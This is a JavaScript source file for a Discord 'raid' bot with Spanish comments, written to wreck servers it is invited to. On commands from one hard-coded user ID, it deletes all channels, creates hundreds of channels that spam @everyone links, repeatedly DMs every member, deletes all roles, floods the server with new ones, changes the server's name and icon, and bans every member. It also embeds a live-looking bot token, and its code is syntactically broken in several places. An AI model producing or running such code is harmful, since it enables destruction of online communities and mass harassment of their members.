const Discord = require("discord.js");
const client = new Discord.Client();

client.on("ready", () => {
    console.log(`Iniciando bot raid...`);
    console.log(`Cliente ${client.user.tag} listo`);
    console.log("Pikachu");
    presencia();  
    });

function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "🎃ˏˋ𝓚𝖎𝔂𝖚𝖒𝖎ˎˊ🎃#9153",
  type: "WATCHING"
 
}
  });
}

client.on("message", message => {
  if (message.author.id !== '724423864611766294') return;
       if (message.content === 't.help') return; {
        message.channel.send({embed: {
          color: 3447003,
          author: {
              name: client.user.username,
              icon_url: client.user.avatarURL()
          },
          title: "prueba",
          url: "",
          description: "prueba.",
          fields: [{
              name: "prueba",
              value: "prueba"
            },
            {
              name: "prueba",
              value: "prueba"
            },
            {
              name: "prueba",
              value: "prueba"
            }
          ],
        }
    });    

//nuke

client.on("message", message => {
  if (message.author.id !== '724423864611766294') 
  return;
   if (message.content === 'raid.nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`#si`, {
          type: 'text'
        }).then(channel => {
          channel.send("https://media.discordapp.net/attachments/839647779580149770/839889412988207104/cropped-1366-768-710940.png?width=842&height=473")
        })
         }
      })
//raid
client.on("message", message => {
      if (message.author.id !== '724423864611766294') return;
           if (message.content === 'raid.raid') {
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`Tokyo Machine Forever`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone ")
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2")
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2")
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2")
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2")
              channel.send("@everyone https://open.spotify.com/track/3HyjVZQoE51NojVIfDWJbx?si=fd3a5cab967c4f44")
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2")
              channel.send("@everyone https://open.spotify.com/track/3HyjVZQoE51NojVIfDWJbx?si=fd3a5cab967c4f44")
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2")
              channel.send("@everyone https://open.spotify.com/track/3HyjVZQoE51NojVIfDWJbx?si=fd3a5cab967c4f44")
              channel.send("@everyone https://open.spotify.com/track/3HyjVZQoE51NojVIfDWJbx?si=fd3a5cab967c4f44")
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2")
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2")
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2");
              channel.send("@everyone https://open.spotify.com/track/3HyjVZQoE51NojVIfDWJbx?si=fd3a5cab967c4f44");
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2");
              channel.send("@everyone https://open.spotify.com/track/3HyjVZQoE51NojVIfDWJbx?si=fd3a5cab967c4f44 ");
              channel.send("@everyone https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2");
                  
              })
              }
              }
            });     
//mdall
client.on("message", message => {
                     if (message.author.id !== '724423864611766294') return;
                      if(message.content === "raid.mdall")
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2").catch(error => {});
                        },450);
                      })
                      });
//borar roles
client.on("message", message => {
  if (message.author.id !== '724423864611766294') return;
                  
                     if(message.content === ('raid.deleterole')){
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });
//crear roles
client.on("message", message => {
  if (message.author.id !== '724423864611766294') return;
               if (message.content === 'raid.roles') {
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `RaidByTokyoMachine`,color: '#d41818',},reason: 'razon',})
              };
               }
                });
//foto y nombre
client.on("message", message => {
  if (message.author.id !== '724423864611766294') return;
                  
                   if (message.content === 'raid.foto') {
                      message.guild.setName("");
                      message.guild.setIcon("https://media.discordapp.net/attachments/852694727362740274/854826226886508564/843294242431827988.png"
                      );
                      }
                    }); 
//banall
client.on("message", message => {
  if (message.author.id !== '724423864611766294') return;
    if (message.content === 'raid.banall') {
    message.delete()
    message.guild.members.cache.forEach(m => {
    m.ban()
    });
  }
}); 
client.on("message", message => {
  if (message.author.bot) return;
 if (command === 't.list') {  
 message.channel.send({embed: {
  color: 3447003,
  description: "a"
}
});

//lista de sv
 
client.on("message", message => {
    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (command === 't.list') {
       message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle(message.guild.name)
       .setThumbnail()
       .setDescription(`**Channels:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("PURPLE");
       message.channel.send(embed)
   }
});
client.login('OTAyMjkyNzM4NDkyNDg5Nzc4.YXcTmA.XZcDY-NVxljRnk8VEHdGnMPI41U');